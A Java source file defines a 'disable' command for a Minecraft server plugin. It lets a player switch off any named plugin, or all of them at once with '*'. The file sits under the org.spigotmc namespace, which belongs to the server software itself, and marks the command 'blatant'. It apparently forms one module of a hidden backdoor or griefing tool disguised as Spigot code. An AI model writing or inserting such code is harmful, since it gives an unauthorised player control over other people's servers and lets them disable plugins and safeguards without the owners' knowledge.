package org.spigotmc.commands.impl.server;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo(
    name = "disable",
    usage = "disable <plugin>",
    desc = "Disables another plugin",
    blatant = true
)
public class Disable extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE(Disable.class.getAnnotation(CommandInfo.class).usage()));
        } else if (args[1].equals("*")) {
            for (Plugin pl2 : Bukkit.getServer().getPluginManager().getPlugins()) {
                Bukkit.getServer().getPluginManager().disablePlugin(pl2);
            }
            p.sendMessage(Settings.PREFIX("You disabled all of the plugins on the server!"));
        } else {
            Plugin targetPlugin = Bukkit.getPluginManager().getPlugin(args[1]);
            if (targetPlugin == null) {
                p.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
			} else if (Bukkit.getPluginManager().getPlugin(args[1]).isEnabled()) {
                Bukkit.getServer().getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(args[1]));
                p.sendMessage(Settings.PREFIX(Settings.PURPLE + args[1] + Settings.WHITE + " is now disabled"));
            } else {
                p.sendMessage(Settings.PREFIX(args[1] + " is already disabled!"));
            }
        }
    }
}
